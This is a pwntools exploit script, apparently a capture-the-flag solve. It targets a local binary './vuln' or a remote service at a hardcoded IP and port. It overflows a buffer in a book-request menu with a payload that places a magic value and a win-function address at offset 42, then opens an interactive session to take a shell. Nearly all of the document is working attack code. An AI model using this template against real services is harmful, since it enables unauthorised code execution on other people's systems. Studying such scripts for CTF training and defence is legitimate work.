from pwn import *

HOST = "34.101.234.148"
PORT = "8128"

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (brea kpoints etc)
gdbscript = """
init-pwndbg
b *reqBook+93
b *reqBook+147
b *secretBook+14
c
c
""".format(
    **locals()
)

# Binary filename
exe = "./vuln"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = 42
# Start program
io = start()

# Build the payload
ADDR_WIN = 0x08049698
payload = flat({offset: [p64(0x12A150E3), p64(ADDR_WIN)]})
# second_payload = flat({8: [b"a b", p64(0x12A150E3)]})

# Send the payload
print(io.recvuntil(b"Enter your choice: "))

io.sendline(b"4")
io.sendlineafter(b"Book: ", b"\x00" * 8 + payload)

# Got Shell?
io.interactive()